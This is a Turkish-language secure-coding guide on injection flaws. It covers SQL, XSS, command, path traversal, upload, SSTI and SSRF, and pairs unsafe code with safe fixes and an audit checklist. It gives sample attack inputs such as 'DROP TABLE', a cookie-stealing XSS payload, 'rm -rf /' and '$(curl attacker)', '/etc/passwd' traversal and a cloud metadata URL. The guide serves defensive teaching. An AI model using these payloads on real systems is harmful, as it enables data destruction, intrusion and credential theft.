# Injection & girdi doğrulama — dil-agnostik

OWASP A05. Ortak kök neden: güvenilmeyen girdinin **veri** değil **komut/kod**
olarak yorumlanması. Genel savunma sırası: (1) girdiyi doğrula (allowlist),
(2) sink'e uygun parametreleme/kaçış kullan, (3) en az yetki. Tek savunma her
sink'e yetmez — her sink kendi bağlamının savunmasını ister.

## İçindekiler
- SQL injection
- Cross-Site Scripting (XSS)
- Komut enjeksiyonu
- Path traversal
- Dosya upload doğrulama
- Template / SSTI ve diğer sink'ler
- SSRF (istek yönü injection)
- Girdi doğrulama ilkesi (allowlist)
- Denetim checklist

---

## SQL injection
Girdi string birleştirmeyle sorguya giriyor.

**Güvensiz:**
```
query = "SELECT * FROM users WHERE email = '" + email + "'"
```
İstismar: `email = ' OR '1'='1` → tüm satırlar; `'; DROP TABLE users; --` →
yıkım; `UNION SELECT` → veri sızıntısı.

**Güvenli — parametreli sorgu (her dilde birincil çözüm):**
```
# Python
cur.execute("SELECT * FROM users WHERE email = %s", (email,))
# Node
db.query("SELECT * FROM users WHERE email = $1", [email])
# Java
ps = conn.prepareStatement("... WHERE email = ?"); ps.setString(1, email)
```
Kaçış (escaping) ikinci sınıf savunmadır; parametreleme tercih edilir.

**Dikkat:** Parametreleme kolon/tablo adını, `ORDER BY` yönünü, `LIMIT`
ifadesini **koruyamaz** — bunlar için allowlist zorunlu (`if col not in
{"name","date"}: reject`). ORM kullanımı da raw fragment (`whereRaw`,
`extra`, `$queryRawUnsafe`) ile delinebilir.

## Cross-Site Scripting (XSS)
Girdi HTML/JS bağlamına kaçışsız yerleşiyor; kurbanın tarayıcısında script çalışır.

**Türler:**
- **Stored:** Payload DB'ye kaydedilir, her görüntüleyene çalışır (en yüksek etki).
- **Reflected:** Payload istekten yanıta yansır (kötü link).
- **DOM-based:** İstemci JS'i güvenilmeyen veriyi `innerHTML`/`document.write`
  ile DOM'a basar.

**Güvensiz sinyaller:**
```
element.innerHTML = userInput           // JS
dangerouslySetInnerHTML={{__html: x}}   // React
<div v-html="x">                         // Vue
{{{ x }}}                                // Handlebars (kaçışsız)
Markup(user_input)  /  |safe             // Jinja/Flask
```

**Savunma:**
- Bağlama uygun **çıktı kodlaması** (framework'ün otomatik kaçışını bırak,
  bypass'lara başvurma). HTML gövdesi, attribute, JS, URL bağlamları farklı
  kaçış ister.
- Kullanıcı HTML girecekse allowlist tabanlı sanitizer (DOMPurify vb.).
- Savunma derinliği: `Content-Security-Policy` header'ı.

**İstismar:** `<img src=x onerror=alert(document.cookie)>` kaydeder, admin
paneline yansırsa oturum çerezi sızar.

## Komut enjeksiyonu
Girdi bir shell/OS komutuna giriyor.

**Güvensiz:**
```
os.system("ping " + host)
exec(`convert ${file} out.png`)
```
İstismar: `host = "8.8.8.8; rm -rf /"` veya `$(curl attacker)`.

**Savunma:** Shell'i tümden atla, argümanları dizi olarak geçir
(`subprocess.run(["ping", host])`, `shell=False`); mümkünse kütüphane çağrısı
kullan, host'u allowlist/regex ile doğrula. `eval`/`exec`/`Function()`
güvenilmeyen girdiyle asla.

## Path traversal
Girdi dosya yoluna giriyor; `../` ile hedef dizinden çıkılıyor.

**Güvensiz:**
```
open(base_dir + "/" + filename)      # filename = "../../etc/passwd"
```
İstismar: `../../../../etc/passwd`, çift kodlama `%2e%2e%2f`, mutlak yol
`/etc/passwd`, null byte `file.txt\0.png`.

**Savunma:** Yolu **normalize et ve kök dizin içinde kaldığını doğrula**
(`os.path.realpath(p).startswith(realpath(base))`); dosya adını allowlist/
whitelist karaktere indir; kullanıcı girdisini asla ham yol olarak kullanma.

## Dosya upload doğrulama
Upload çoklu injection yüzeyidir.

**Kontrol listesi:**
- **Tür:** Uzantı + istemci `Content-Type` yalan söyler; içerik/magic-byte
  doğrula. Uzantıyı allowlist ile sınırla (blacklist'i atlatırlar: `.php5`,
  `.phtml`, çift uzantı `x.jpg.php`).
- **Ad:** Yeniden adlandır (rastgele), path traversal içeren adı reddet,
  orijinal adı sanitize et.
- **Konum:** Web-erişilebilir dizine yazma; çalıştırılabilirliği kapat.
- **Boyut:** Limit koy (DoS/disk dolumu).
- **İçerik:** Görsel ise yeniden encode et (gömülü payload'u kır); arşiv ise
  zip-slip (`../` içeren giriş) ve zip-bomb kontrolü.
- **SVG:** SVG XSS taşır (gömülü script) — HTML olarak servis etme veya sanitize et.

**İstismar:** `shell.php`'yi `image/png` Content-Type'ıyla yükleyip web
dizinine düşürmek → RCE.

## Template / SSTI ve diğer sink'ler
- **SSTI:** Kullanıcı girdisi şablon motoruna string olarak derleniyor
  (`render_template_string(user)`) → sunucu tarafı kod yürütme. Girdiyi
  şablon kaynağı yapma; yalnız veri olarak geçir.
- **LDAP / NoSQL / XML(XXE):** Aynı kök — parametreleme/kaçış yoksa injection.
  XXE için harici entity çözümlemesini kapat.
- **Log injection:** Girdideki `\n` ile sahte log satırı; loga yazmadan önce
  newline/kontrol karakteri temizle.

## SSRF (istek yönü injection)
Girdi, sunucunun **yapacağı** isteğin URL'ini belirliyor.
```
fetch(userSuppliedUrl)     // userUrl = "http://169.254.169.254/latest/meta-data/"
```
İstismar: iç ağ/metadata servisine erişim, port tarama. Savunma: hedef host
allowlist'i, iç IP aralıklarını (RFC1918, link-local, localhost) reddet,
redirect'leri sınırla.

## Girdi doğrulama ilkesi (allowlist)
- **Allowlist > blacklist:** "İzinliyi tanımla" (blacklist her zaman atlatılır).
- **Doğrula + normalize et:** Kanonik forma getir, sonra kontrol et (aksi halde
  kodlama/encoding ile bypass).
- **Sink'te savun, girişte değil sadece:** Erken doğrulama iyidir ama nihai
  savunma sink'in kendi mekanizmasıdır (parametreleme, kodlama).
- **Tip + biçim + uzunluk + aralık:** Sayı bekliyorsan int'e zorla, e-posta
  ise regex + uzunluk sınırı.

## Denetim checklist
- [ ] SQL: string birleştirme var mı? Parametreleme kullanılıyor mu? Raw ORM
      fragment var mı? Kolon/sıralama allowlist'li mi?
- [ ] XSS: `innerHTML`/`v-html`/`dangerouslySetInnerHTML`/`|safe` var mı?
      Otomatik kaçış bypass ediliyor mu? CSP var mı?
- [ ] Komut: `system`/`exec`/`shell=True` girdiyle mi? Argüman dizisi mi?
- [ ] Path: kullanıcı girdisi dosya yolunda mı? Kök-içi doğrulama var mı?
- [ ] Upload: içerik+uzantı doğrulama, yeniden adlandırma, exec kapatma,
      boyut/zip-slip kontrolü var mı?
- [ ] Template/deserialize/SSRF sink'i güvenilmeyen girdiyle besleniyor mu?
